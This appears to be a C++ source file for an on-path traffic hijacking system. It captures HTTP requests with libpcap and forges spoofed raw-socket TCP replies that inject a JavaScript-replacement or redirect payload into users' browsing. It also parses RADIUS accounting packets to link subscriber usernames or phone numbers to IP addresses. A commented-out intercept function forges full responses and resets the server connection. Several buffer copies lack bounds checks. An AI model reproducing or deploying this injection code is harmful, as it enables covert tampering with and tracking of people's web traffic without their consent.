
#include "pcap_util.h"
#include "radius.h"
// #include "redis.h"
// #include "log.h"
// #include "config_loader.h"
#include "core.h"
#include <atomic>

// Redis* redis = Redis::getInstance();;
extern ConfigLoader *conf;
extern Redis *redis;
extern int worker_num;
int http_port = 80;

queue<u_char*> task_queue[64];

// queue<vector<u_char>> task_queue[64];

sem_t sem[64];
atomic_flag lock_self[64] = {ATOMIC_FLAG_INIT};

void print_hex_ascii_line(const u_char *payload, int len, int offset)
{

    int i;
    int gap;
    const u_char *ch;

    /* offset */
    printf("%05d   ", offset);

    /* hex */
    ch = payload;
    for(i = 0; i < len; i++) {
        printf("%02x ", *ch);
        ch++;
        /* print extra space after 8th byte for visual aid */
        if (i == 7)
            printf(" ");
    }
    /* print space to handle line less than 8 bytes */
    if (len < 8)
        printf(" ");

    /* fill hex gap with spaces if not full line */
    if (len < 16) {
        gap = 16 - len;
        for (i = 0; i < gap; i++) {
            printf("   ");
        }
    }
    printf("   ");

    /* ascii (if printable) */
    ch = payload;
    for(i = 0; i < len; i++) {
        if (isprint(*ch))
            printf("%c", *ch);
        else
            printf(".");
        ch++;
    }

    printf("\n");

return;
}

void print_payload(const u_char *payload, int len)
{

    int len_rem = len;
    int line_width = 16;            /* number of bytes per line */
    int line_len;
    int offset = 0;                 /* zero-based offset counter */
    const u_char *ch = payload;

    if (len <= 0)
        return;

    /* data fits on one line */
    if (len <= line_width) {
        print_hex_ascii_line(ch, len, offset);
        return;
    }

    /* data spans multiple lines */
    for ( ;; ) {
        /* compute current line length */
        line_len = line_width % len_rem;
        /* print line */
        print_hex_ascii_line(ch, line_len, offset);
        /* compute total remaining */
        len_rem = len_rem - line_len;
        /* shift pointer to remaining bytes to print */
        ch = ch + line_len;
        /* add offset */
        offset = offset + line_width;
        /* check if we have line width chars or less */
        if (len_rem <= line_width) {
            /* print last line and get out */
            print_hex_ascii_line(ch, len_rem, offset);
            break;
        }
    }

return;
}

int16_t InChkSum(uint16_t *addr,int16_t len)
{
    register int sum = 0;
    uint16_t answer = 0;
    register u_short *w = addr;
    register int nleft = len;

    if(NULL == addr)
    {
        return 0;
    }
    // 算法是使用一个32位数，累加待校验地址连续的16位，将进位折回低16位
    while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }

    /* mop up an odd byte, if necessary */
    if (nleft == 1)
    {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
    }

    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
    sum += (sum >> 16);                     /* add carry */
    answer = ~sum;                          /* truncate to 16 bits */
    return(answer);
}

// TCP校验和计算
// length为tcp头的长度+tcp后面数据的长度
// tcp_packet为指向tcp首部的指针
uint16_t tcp_checksum(struct in_addr psd_saddr,struct in_addr psd_daddr,unsigned proto,uint16_t length,char * tcp_packet)
{
    uint16_t answer;

    if(NULL == tcp_packet) {
        return 0;
    }
    struct psd_header psdhdr;

    psdhdr.saddr =  psd_saddr;
    psdhdr.daddr =  psd_daddr;
    psdhdr.mbz   =  0;
    psdhdr.ptcl  =  proto;
    psdhdr.tcpl  =  htons(length);

    char tocheck_buf[4096];

    memcpy(tocheck_buf,&psdhdr,sizeof(psdhdr));
    memcpy(tocheck_buf+sizeof(psdhdr),tcp_packet,length);
    answer = (uint16_t)InChkSum((uint16_t *)tocheck_buf,sizeof(psdhdr)+length);

    return answer;
}


// 构造包
void inject(const struct ip  * req_ip,const struct tcphdr * req_tcp,char * origin_url,const char* tplname)
{
    int sockfd;
    // const int on=1;
    int one = 1;
    const int *val = &one;

    sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    if (sockfd<0)
    {
        LOG_WARN("create sock raw error");
        printf("%s\n", "create sock raw error");
    }

    if(setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,val,sizeof(one))<0)
    {
        LOG_WARN("setsockopt set failed");
        printf("%s\n", "setsockopt set failed");
    }

    // 加载js模版
    char inject_payload[4096];
    sprintf(inject_payload,conf->getTemplate(tplname),origin_url);
    int inject_payload_len = strlen(inject_payload);
    // printf("origin url %s\n", origin_url);
    // LOG_DEBUG("origin url--> %s", origin_url);

    char buf[4096]={0};
    struct ip *ip;
    struct tcphdr * tcp;
    int ip_len;

    ip_len = sizeof(struct ip)+sizeof(struct tcphdr)+inject_payload_len;
    int ip_hdr_len = req_ip->ip_hl<<2;
    int tcp_hdr_len = req_tcp->doff<<2;

    // 构造IP包
    ip         = (struct ip* )buf;
    ip->ip_v   = IPVERSION;
    ip->ip_hl  = sizeof(struct ip)>>2;
    // ip->ip_tos = 0;
    ip->ip_len = htons(ip_len);
    ip->ip_id  = htons(12345);
    // ip->ip_off = 0;
    ip->ip_ttl = 125;
    ip->ip_p   = IPPROTO_TCP;
    ip->ip_dst = req_ip->ip_src;
    ip->ip_src = req_ip->ip_dst;
    ip->ip_sum = InChkSum((uint16_t *)ip,sizeof(struct ip));

    // 拷贝内容到发送缓冲区 此代码必须在tcp校验和计算之前，因为校验和的计算包括数据部分
    // 40是ip和tcp长度和。固定的，因为构造出的包就是这么长
    char * payload_start = buf+40;
    memcpy(payload_start,inject_payload,inject_payload_len);

    // 构造TCP包
    tcp          = (struct tcphdr*)(buf+sizeof(struct ip));
    tcp->source  = req_tcp->dest;
    tcp->dest    = req_tcp->source;
    tcp->seq     = req_tcp->ack_seq;
    tcp->ack_seq = htonl(ntohl(req_tcp->seq)+(ntohs(req_ip->ip_len)-ip_hdr_len-tcp_hdr_len));
    // printf("ack_seq caculate %ld %d %d %d\n", ntohl(req_tcp->seq),ntohs(req_ip->ip_len),tcp_hdr_len,tcp_hdr_len);
    tcp->doff    = 5;
    tcp->ack     = 1;
    tcp->fin     = 1;
    // tcp->syn     = 0;
    // tcp->rst     = 0;
    tcp->psh     = 1;
    // tcp->urg     = 0;
    tcp->window  = htons (12048);
    // tcp->check   = 0;
    // 去掉IP头
    tcp->check = tcp_checksum(ip->ip_src,ip->ip_dst,IPPROTO_TCP,ip_len-20,buf+20);


    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port   = tcp->dest;
    target_addr.sin_addr   = ip->ip_dst;


    unsigned response_len;
    response_len = sendto(sockfd,buf,ip_len,0,(struct sockaddr*)&target_addr,sizeof(struct sockaddr_in));
    if (response_len==0)
    {
        LOG_WARN("response_len is 0");
        printf("%s\n", "response_len is 0");
    }
    close(sockfd);

    // printf("%s\n", "inject success");
    // printf("req iplen %d\n" ,ntohs(req_ip->ip_len));
    // // printf("%s\n", inject_payload);
    // // for (int i = 0; i < ip_len; ++i)
    // // {
    // //     printf("%x", buf[i]);
    // // }
    // printf("\n***********\n");
    // for (int i = 40; i < ip_len; ++i)
    // {
    //     printf("%c", buf[i]);
    // }

    // printf("response_len len:%d \n", response_len);
    // printf("send len:%d \n", ip_len);

    // printf("ip chksum :%x\n", ip->ip_sum );
    // printf("tcp chksum :%x\n", tcp->check );

    // printf("ip dst :%s \n", inet_ntoa(ip->ip_dst));
    // printf("target port :%d\n", ntohs(tcp->dest));
    // printf("ip src :%s \n", inet_ntoa(ip->ip_src));
    // printf("src port :%d\n", ntohs(tcp->source));

    // printf("seq    :%ld\n", ntohl(tcp->seq) );
    // printf("seq    :%04x\n", ntohl(tcp->seq) );
    // printf("ackseq :%ld\n", ntohl(tcp->ack_seq));
    // printf("ackseq :%04x\n", ntohl(tcp->ack_seq));



}


// struct http_header parse_http_header(char* head)
// {
//     struct http_header httphdr;

//     int len  = strlen(head);
//     char keybuf[128];
//     char valbuf[2048];
//     bool in_key_status = true;
//     int index=0;
//     int i;
//     char tmp[1024];
//     // 分析第一行
//     int item=0;
//     for (i = 0; i < len; i++)
//     {
//         if(head[i]==' '){
//             tmp[index]='\0';
//             index = 0;
//             // printf("%s\n", tmp);
//             if(item==1)
//             {
//                 memcpy(httphdr.url,tmp,strlen(tmp));
//                 printf("url---------->%s\n",httphdr.url );

//             }
//             item++;
//             continue;
//         }
//         if(head[i]=='\n' ||head[i]=='\r')
//         {
//             break;
//         }
//         tmp[index++]=head[i];
//     }
//     // printf("<---------------->\n");
//     for (i; i < len; i++)
//     {
//         if(head[i]==':' &&head[i+1]==' '){
//             in_key_status = false;
//             keybuf[index] = '\0';
//             index = 0;
//             i++;
//             // printf("key====%s\n", keybuf);
//             continue;
//         }
//         if(head[i]=='\r')continue;
//         if(head[i]=='\n')
//         {
//             in_key_status = true;
//             valbuf[index] = '\0';
//             index = 0;
//             if(strcmp("Referer",keybuf)==0)
//             {
//                 printf("%s---------->%s\n", keybuf,valbuf);
//                 memcpy(httphdr.referer,valbuf,strlen(valbuf));
//             }

//             continue;
//         }

//         if(in_key_status){
//             keybuf[index++] = head[i];
//         }else{
//             valbuf[index++] = head[i];
//         }

//     }


//     return httphdr;
// }

// unordered_set<string> push_cache;
extern filterPolicy filter_policy;

void parse_http(const u_char *data)
{
    const struct ethhdr * ethernet;  /* The ethernet header [1] */
    const struct ip  * ip;         /* The IP header */
    const struct tcphdr * tcp;         /* The TCP header */

    int ip_start_offset;
    int tcp_start_offset;

    // 解析链路层数据头
    ethernet = (struct ethhdr*)(data);
    if (ntohs(ethernet->h_proto)==ETH_P_IP)
    {
        ip_start_offset = ETH_HLEN;
        ip  = (struct ip*)(data+ip_start_offset);
    }
    else if(ntohs(ethernet->h_proto)==ETH_P_8021Q)
    {
        ip_start_offset = ETH_HLEN+4;
        ip  = (struct ip*)(data+ip_start_offset);
    }else{
        LOG_WARN("pass eth proto: %04x \n",ntohs(ethernet->h_proto));
        return;
    }
    // 处理异常
    int size_ip = ip->ip_hl*4;
    if ( size_ip < 20 ) {
        LOG_WARN("Invalid IP header length: %u bytes", size_ip);
        return ;
    }

    // TCP协议
    if (ip->ip_p==6)
    {
        tcp_start_offset = ip_start_offset+size_ip;
        tcp = (struct tcphdr*)(data+tcp_start_offset);


        if (ntohs(tcp->dest)==http_port)
        {

            int tcp_data_offset = tcp_start_offset+(tcp->doff<<2);
            int data_len = ntohs(ip->ip_len)-size_ip-(tcp->doff<<2);
            char buffer[HTTP_REQUEST_MAX_LEN];
            if (data_len>HTTP_REQUEST_MAX_LEN){
                return;
            }
            memset(buffer,'\0',data_len);
            memcpy(buffer,data+tcp_data_offset,data_len);
            struct http_header request={};
            struct push_decide decide={};
            if(filter_policy.canPush(buffer,ip,tcp,&request,&decide))
            {
                // printf("-----------push-----------\n");
                if(decide.type==1){
                    LOG_DEBUG("push ip:%s %s",inet_ntoa(ip->ip_src),request.path);
                    inject(ip,tcp,request.path,"replace_js");
                }else if(decide.type==2)
                {
                    LOG_DEBUG("%s Redirect-->%s %s to %s",inet_ntoa(ip->ip_src),request.extraHeader["Host"].c_str(),request.path,decide.url);
                    inject(ip,tcp,decide.url,"redirect");
                }
            }else{
                // printf("filtered\n");
                // LOG_DEBUG("filtered\n");
            }
            return;

            // if (buffer[0]=='G' && buffer[1]=='E' && buffer[2]=='T')
            // {
            //     if(strstr(buffer,".js "))
            //     {
            //         printf("dest mac: %06x\n",ethernet->h_dest  );
            //         printf("src %d\n",ntohs(tcp->source) );
            //         printf("dest %d\n",ntohs(tcp->dest) );
            //         printf("seq %d\n",ntohs(tcp->seq) );
            //         // printf("req %s\n",buffer);
            //         char keybuff[128];
            //         // regexec(&reg,buffer,2,pmatch,0);
            //         struct http_header httphdr;
            //         httphdr = parse_http_header(buffer);
            //         if(strstr(buffer,"jquery.js") || strstr(buffer,"jquery.min.js"))
            //         {
            //             return;
            //         }
            //         snprintf(keybuff,128,"%d %s",ip->ip_src,httphdr.referer);
            //         if(push_cache.count(keybuff)<=0)
            //         {
            //             push_cache.insert(keybuff);
            //             printf("key %s\n",keybuff );
            //             printf("%s\n", buffer);
            //             printf("--------------------------------------------------------\n");
            //             inject(ip,tcp,httphdr.url,"replace_js");
            //         }
            //     }

            //         // struct http_header httphdr;
            //         // httphdr = parse_http_header(buffer);
            //         // if(strstr(buffer,".html"))
            //         // {
            //         //     char keybuff[128];
            //         //     snprintf(keybuff,128,"%d %s",ip->ip_src,httphdr.url);
            //         //     if(push_cache.count(keybuff)<=0){
            //         //         push_cache.insert(keybuff);
            //         //         inject(ip,tcp,httphdr.url,"iframe");
            //         //     }
            //         // }

            // }
        }

    }
}


// 解析radius协议
void radius_parse(const u_char *data)
{
    // printf("radius_parse begin \n");
    const struct ethhdr * ethernet;  /* The ethernet header [1] */
    const struct iphdr  * ip;         /* The IP header */
    const struct udphdr * udp;         /* The IP header */
    const radius_head_t * radius_header;

    int ip_start_offset;
    int udp_start_offset;

    // 解析链路层数据头
    ethernet = (struct ethhdr*)(data);
    // printf("%02x\n",ntohs(ethernet->h_proto)  );
    // printf("%s\n",ethernet->h_dest  );
        /* define/compute ip header offset */

    // printf("h_proto %04x\n",ntohs(ethernet->h_proto) );
    // 解析IP数据
    if (ntohs(ethernet->h_proto)==ETH_P_IP)
    {
        ip_start_offset = ETH_HLEN;
        ip  = (struct iphdr*)(data+ip_start_offset);
    }
    else if(ntohs(ethernet->h_proto)==ETH_P_8021Q)
    {
        ip_start_offset = ETH_HLEN+4;
        ip  = (struct iphdr*)(data+ip_start_offset);
    }else{
        LOG_WARN("pass eth proto: %04x \n",ntohs(ethernet->h_proto));
        return;
    }

    // 处理异常
    int size_ip = ip->ihl*4;
    if ( size_ip < 20 ) {
        LOG_WARN("Invalid IP header length: %u bytes", size_ip);
        return ;
    }

    // printf("ip->protocol %02x ip_size%d\n",ip->protocol,size_ip );
    // 如果是UDP数据,处理
    if (ip->protocol==17)
    {
        udp_start_offset = ip_start_offset+size_ip;
        udp = (struct udphdr*)(data+udp_start_offset);
        // printf("src port %d\n",ntohs(udp->source));

        radius_header = (radius_head_t*)(data+(udp_start_offset+8));

        // printf("radius_header->code: %02x\n",radius_header->code);
        // printf("radius_header->identifier: %02x\n",radius_header->identifier);
        if(radius_header->code==0x04)
        {
            radius_attr_t * radius_attr;
            int attr_first_offset   = (udp_start_offset+8+20);
            int parsed_len    = 0;
            int attr_data_len = ntohs(radius_header->length)-20;
            int safe_quit_num = 0;

            char username[25] = {0};
            char ip[15]       = {0};
            int status_buff;

            while(parsed_len < attr_data_len)
            {
                int attr_offset = attr_first_offset+parsed_len;
                radius_attr = (radius_attr_t *)(data+attr_offset);
                // printf("len %d", radius_attr->len);
                // printf(" type %d", radius_attr->type);
                // printf("parsed_len %d\n", parsed_len);
                char value_buff[64] = {0};



                switch(radius_attr->type){
                    case RADIUS_ATTR_NAME:
                        memcpy(value_buff,data+(attr_offset+2),radius_attr->len-2 );
                        // printf("-----------User-Name = %s ", value_buff);
                        sprintf(username,"%s",value_buff);
                        break;
                    case RADIUS_ATTR_IP:
                        ip_address* addr;
                        addr = (ip_address*)(data+(attr_offset+2));
                        // printf("IP: %d.%d.%d.%d ",addr->byte1,addr->byte2,addr->byte3,addr->byte4 );
                        sprintf(ip,"%d.%d.%d.%d",addr->byte1,addr->byte2,addr->byte3,addr->byte4);
                        break;
                    case RADIUS_ATTR_ACCT_STATUS_TYPE:
                        uint32_t status;
                        status = ntohl(*((uint32_t *)(data+(attr_offset+2))));
                        // printf("status %ld\n",status);
                        // sprintf(status_buff,"%d",status);
                        status_buff = (int)status;
                        break;
                    case 25:
                        char value_buff[64] = {0};
                        memcpy(value_buff,data+(attr_offset+2),radius_attr->len-2 );
                        // printf("-----------Phone = %s ", value_buff);
                        sprintf(username,"%s",value_buff);
                        break;
                }
                parsed_len+=(radius_attr->len);
                // 应该不会执行到，防止死循环
                safe_quit_num++;
                if (safe_quit_num > RADIUS_ATTR_MAX_COUNT)
                {
                    LOG_WARN("Error parse radis attr");
                    return ;
                }
            }

            char cmd[64];
            if (status_buff==2)
            {
                sprintf(cmd,"hdel radius:online %s",ip);
                sprintf(cmd,"hdel radius:online_u %s",username);
            }else{
                sprintf(cmd,"hset radius:online %s %s",ip,username);
                sprintf(cmd,"hset radius:online_u %s %s",username,ip);
            }
            redis->execute(cmd);

            LOG_DEBUG("username=%s ip=%s status=%d", username,ip,status_buff);


        }
    }
}

// 工作线程
void * http_handler_worker(void * arg){
    pthread_t tid;
    tid = pthread_self();
    int *p = (int*)arg;
    while(true){
        sem_wait(&sem[*p]);

        while(lock_self[*p].test_and_set()){}
        if(!task_queue[*p].empty()){
            // parse_http(&task_queue[*p].front().begin()[0]);
            parse_http(task_queue[*p].front());
            delete task_queue[*p].front();
            task_queue[*p].pop();
        }
        lock_self[*p].clear();
    }
}

void * radius_handler_worker(void * arg){
    // pthread_t tid;
    // tid = pthread_self();
    // int *p = (int*)arg;
    // while(true){
    //     sem_wait(&sem[*p]);
    //     if(!task_queue[*p].empty()){
    //         radius_parse(task_queue[*p].front());
    //         // delete task_queue[*p].front();
    //         task_queue[*p].pop();
    //     }
    // }
}

void my_callback(u_char * args,const struct pcap_pkthdr* pkthdr,const u_char * packet)
{
    // printf("%d\n",pkthdr->caplen );
    // printf("%d\n",pkthdr->ts );
    // printf("--------------\n");

    // parse_http(packet);
    // return;

    // printf("\n----------------------------------------------\n");
    // printf(FONT_COLOR_YELLOW "%s   " COLOR_NONE,packet);

    // 转入队列
    const struct ip  * ip;
    // u_char package_p[1024*64];
    u_char* package_p = new u_char[pkthdr->caplen]();
    memcpy(package_p,packet,pkthdr->caplen);
    // printf("%d\n",pkthdr->caplen );

    // vector<u_char> datav;
    // for (int i = 0; i < pkthdr->caplen; ++i)
    // {
    //     datav.push_back(packet[i]);
    // }

    // 根据ip hash计算队列号
    ip = (struct ip*)(packet + SIZE_ETHERNET);
    int hash_bucket = ntohl(ip->ip_src.s_addr) % worker_num;
    // task_queue[hash_bucket].push( package_p );
    // 这里貌似要枷锁
    while(lock_self[hash_bucket].test_and_set()){}
    task_queue[hash_bucket].push( package_p );
    lock_self[hash_bucket].clear();
    sem_post(&sem[hash_bucket]);
    return;
}

// 生产者线程
void* pcap_init(void * arg)
{
    char err_buf[PCAP_ERRBUF_SIZE],* device;

    const char *filter_exp = conf->get("pcap","filter_exp","port 80");
    const char *eth        = conf->get("pcap","eth","eth1");
    http_port              = atoi( conf->get("pcap","http_port","80") );

    printf("filter_exp:%s\n",filter_exp );
    printf("eth:%s\n",eth );

    pcap_t * dev = pcap_open_live(eth,65535,1,0,err_buf);

    if (!dev)
    {
        printf("error: pcap_open_live(): %s\n", err_buf);
        exit(1);
    }
    struct bpf_program fp;
    // conf->get("pcap","filter_exp","port 80");
    bpf_u_int32 mask;      /* The netmask of our sniffing device */
    bpf_u_int32 net;       /* The IP of our sniffing device */

    if (pcap_compile(dev, &fp, filter_exp, 0, net) == -1) {
         fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(dev));
         // return(2);
         exit(-1);
     }

    if (pcap_setfilter(dev, &fp) == -1) {
         fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(dev));
         exit(-1);
         // return(2);
     }
    u_char* args = NULL;
    pcap_loop(dev,0,my_callback,args);


    // struct pcap_pkthdr *packet;
    // const u_char * pktStr;
    // int pcap_status;
    // while(true){
    //     pcap_status = pcap_next_ex(dev,&packet,&pktStr);
    //     if(pcap_status==1){
    //         parse_http(pktStr);
    //     }else{
    //         printf("error %d\n", pcap_status);
    //     }
    // }

    // if (!pktStr)
    // {
    //     printf("did not capture a packet!\n");
    //     exit(1);
    // }

    // printf("Packet length: %d\n", packet.len);
    // printf("Number of bytes: %d\n", packet.caplen);
    // printf("Recieved time: %s\n", ctime((const time_t *)&packet.ts.tv_sec));

    pcap_close(dev);
}



int pcap_open(const char * filepath)
{
    LOG_DEBUG("open pcap file");
    char errbuff[PCAP_ERRBUF_SIZE];
    pcap_t * pcap =  pcap_open_offline(filepath,errbuff);

    struct pcap_pkthdr * header;
    const u_char *data;
    u_int packetCount = 0;
    // const int eth_802_offset = 4;
    // connectRedis();
    // redis = Redis::getInstance();
    // redis->connect("127.0.0.1",6379,"MhxzKhl");
    redis->select(5);
    // redis->execute("info");



    while(int returnValue = pcap_next_ex(pcap,&header,&data) >=0 )
    {
        // printf("Packet No %i\n",++packetCount);
        // printf("Packet size: %ld bytes\n", header->len);
        // printf("Epoch Time: %ld:%ld seconds\n", header->ts.tv_sec, header->ts.tv_usec);

        // printf("%d\n",gl_test );

        radius_parse(data);
        // parse_http(data);


        // return 0;

        // const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
        // const struct sniff_ip *ip;              /* The IP header */
        // const struct sniff_tcp *tcp;            /* The TCP header */
        // const u_char *payload;                    /* Packet payload */
        // const radius_head_t *radius_head;
        // int size_ip;
        // int size_tcp;
        // int size_payload;

        // int eth_offset;
        // int ip_offset;
        // int udp_offset = 8;
        // int radius_head_offset;

        // ++packetCount;
        // ethernet = (struct sniff_ethernet*)(data);
        // /* define/compute ip header offset */

        // if (ntohs(ethernet->ether_type)==0x8100)
        // {
        //     ip_offset = SIZE_ETHERNET+eth_802_offset;
        //     ip = (struct sniff_ip*)(data +ip_offset);
        // }else if(ntohs(ethernet->ether_type)==0x0800){
        //     ip_offset = SIZE_ETHERNET;
        //     ip = (struct sniff_ip*)(data +ip_offset);
        // }else{
        //     printf("%02x\n",ntohs(ethernet->ether_type)  );
        //     printf("unknown ether_type found\n");
        //     printf("Packet No %i",packetCount);
        //     printf("Packet size: %ld bytes\n", header->len);
        //     printf("Epoch Time: %ld:%ld seconds\n", header->ts.tv_sec, header->ts.tv_usec);
        // }
        // printf("Packet No %i",packetCount);
        // // continue;

        // size_ip = IP_HL(ip)*4;
        // printf("iphl = %02x\n", ip->ip_vhl  );



        // if (size_ip < 20) {
        //     printf("   * Invalid IP header length: %u bytes\n", size_ip);
        //     return 0;
        // }
        // // UDP
        // if(ip->ip_p==0x11) {
        //     radius_head_offset = ip_offset+size_ip+udp_offset;
        //     radius_head = (radius_head_t*)(data+radius_head_offset);
        //     printf("code = %02x\n", radius_head->code  );
        //     if (radius_head->code!=0x04)
        //     {
        //         continue;
        //     }
        //     printf("identifier = %02x\n", radius_head->identifier  );
        //     printf("length = %04x\n", ntohs(radius_head->length)  );
        //     radius_attr_t* attr;
        //     attr = (radius_attr_t*)(data+radius_head_offset+20);
        //     printf("attr type = %02x\n", attr->type  );
        //     printf("attr len = %02x\n", attr->len  );

        //     char value[64] = {0};
        //     memcpy(value,data+radius_head_offset+22,attr->len );
        //     // printf("%d", attr->len );
        //     // for (int i = 0; i<attr->len; i++)
        //     // {
        //     //     // value[i] = (char)ntohs(value[i]);
        //     //     printf("%02x", value[i]  );
        //     // }
        //     printf("userName = %s\n",value  );

        // }

        // /* print source and destination IP addresses */
        // printf("       From: %s\n", inet_ntoa(ip->ip_src));
        // printf("         To: %s\n", inet_ntoa(ip->ip_dst));

        // for(u_int i=0 ;i<header->caplen;i++)
        // {
        //     if( (i%16)==0 )printf("\n");
        //     printf("%.2x",data[i] );
        // }
        // return 0;

    }

    printf("\n\n");


}




// #define PACKET_MAX 1024
// static void intercept(const struct request *request, const char *response, int len) {
//         struct iphdr *iph;
//         struct tcphdr *tcph;
//         char *option, *payload, buf[PACKET_MAX], str[32];
//         int head_len, payload_len, payload_max, n, last;

//         struct timestamp {
//                 char nop[2];
//                 char kind;
//                 char length;
//                 int TSval;
//                 int TSecr;
//         } *ts1, *ts2;

//         iph = (struct iphdr *)buf;
//         tcph = (struct tcphdr *)((char *)iph + sizeof(struct iphdr));
//         option = (request->option != NULL ? ((char *)tcph + sizeof(struct tcphdr)) : NULL);
//         payload = (char *)tcph + (request->tcph->doff << 2);
//         payload_max = PACKET_MAX - (payload - (char *)iph);
//         head_len = sizeof(struct iphdr) + (request->tcph->doff << 2);

//         /* 初始化IP包头部 */
//         iph->version = 4;
//         iph->ihl = sizeof(struct iphdr) >> 2;
//         iph->tos = 0;
//         //iph->tot_len = htons(sizeof(struct iphdr) + (request->tcph->doff << 2));
//         iph->id = htons((unsigned short)((timeptr->time >> 16) + (timeptr->time & 0xffff)));
//         iph->frag_off = htons(IP_DF);;
//         iph->ttl = 64;
//         iph->protocol = IPPROTO_TCP;
//         //iph->check = 0;
//         iph->saddr = request->iph->daddr;
//         iph->daddr = request->iph->saddr;

//         /* 初始化TCP包头部 */
//         //tcph->source = 0;
//         //tcph->dest = 0;
//         //tcph->seq = 0;
//         //tcph->ack_seq = 0;
//         tcph->doff = (payload - (char *)tcph) >> 2;
//         tcph->res1 = 0;
//         tcph->res2 = 0;
//         tcph->urg = 0;
//         tcph->ack = 0;
//         tcph->psh = 0;
//         tcph->rst = 0;
//         tcph->syn = 0;
//         tcph->fin = 0;
//         tcph->window = htons(5840);
//         //tcph->check = 0;
//         tcph->urg_ptr = 0;

//         /* 设置TCP OPTION */
//         if (option != NULL && request->option != NULL) {
//                 ts1 = (struct timestamp *)option;
//                 ts2 = (struct timestamp *)request->option;
//                 if (ts2->nop[0] == 1 && ts2->nop[1] == 1 && ts2->kind == 8 && ts2->length == 10) {
//                         ts1->nop[0] = 1;
//                         ts1->nop[1] = 1;
//                         ts1->kind = 8;
//                         ts1->length = 10;
//                         ts1->TSval = ts2->TSecr + 100;
//                         ts1->TSecr = ts2->TSval;
//                 } else {
//                         option = NULL;
//                 }
//         }

//         /* 发送请求的确认包客户端(是否可以取消?) */
//         iph->id = htons(ntohs(iph->id) + 1);
//         iph->tot_len = htons(head_len);
//         iph->protocol = IPPROTO_TCP;
//         iph->saddr = request->iph->daddr;
//         iph->daddr = request->iph->saddr;

//         tcph->source = request->tcph->dest;
//         tcph->dest = request->tcph->source;
//         tcph->ack = 1;
//         tcph->seq = request->tcph->ack_seq;
//         tcph->ack_seq = htonl(ntohl(request->tcph->seq) + ntohs(request->iph->tot_len) - (request->payload - (char *)request->iph));
//         checksum(iph, tcph);
//         send_pkt(sockfd, iph->daddr, tcph->dest, iph, head_len);

//         /* 发送HTTP应答给客户端, 每个IP包不能大于1500*/
//         for (n = 0, last = 0; n < len; n += payload_max) {
//                 payload_len = len - n > payload_max ? payload_max : len - n;
//                 iph->id = htons(ntohs(iph->id) + 1);
//                 iph->tot_len = htons(head_len + payload_len);
//                 tcph->psh = 1;
//                 tcph->seq = htonl(ntohl(tcph->seq) + last);
//                 last = payload_len;
//                 memcpy(payload, &response[n], payload_len);
//                 checksum(iph, tcph);
//                 send_pkt(sockfd, iph->daddr, tcph->dest, iph, head_len + payload_len);
//         }

//         /* 关闭客户端TCP连接 */
//         iph->id = htons(ntohs(iph->id) + 1);
//         iph->tot_len = htons(head_len);
//         tcph->psh = 0;
//         tcph->fin = 1;
//         //pkt.tcp.rst = 1;
//         tcph->seq = htonl(ntohl(tcph->seq) + (len % payload_max));
//         checksum(iph, tcph);
//         send_pkt(sockfd, iph->daddr, tcph->dest, iph, head_len);

//         /* 关闭服务端TCP连接 */
//         iph->id = htons(ntohs(request->iph->id) + 1);
//         iph->saddr = request->iph->saddr;
//         iph->daddr = request->iph->daddr;

//         /* 设置TCP OPTION */
//         if (option != NULL && request->option != NULL) {
//                 ts1 = (struct timestamp *)option;
//                 ts2 = (struct timestamp *)request->option;
//                 if (ts2->nop[0] == 1 && ts2->nop[1] == 1 && ts2->kind == 8 && ts2->length == 10) {
//                         ts1->nop[0] = 1;
//                         ts1->nop[1] = 1;
//                         ts1->kind = 8;
//                         ts1->length = 10;
//                         ts1->TSval = ts2->TSval;
//                         ts1->TSecr = ts2->TSecr;
//                 } else {
//                         option = NULL;
//                 }
//         }

//         tcph->source = request->tcph->source;
//         tcph->dest = request->tcph->dest;
//         tcph->fin = 0;
//         tcph->rst = 1;
//         tcph->seq = htonl(ntohl(request->tcph->seq) + head_len);
//         tcph->ack_seq = request->tcph->ack_seq;
//         checksum(iph, tcph);
//         send_pkt(sockfd, iph->daddr, tcph->dest, iph, head_len);

//         inet_ntop(AF_INET, &request->iph->saddr, str, sizeof(str));
//         log_info("intercept http request [%s] from %s", request->url, str);
//         return;
// }
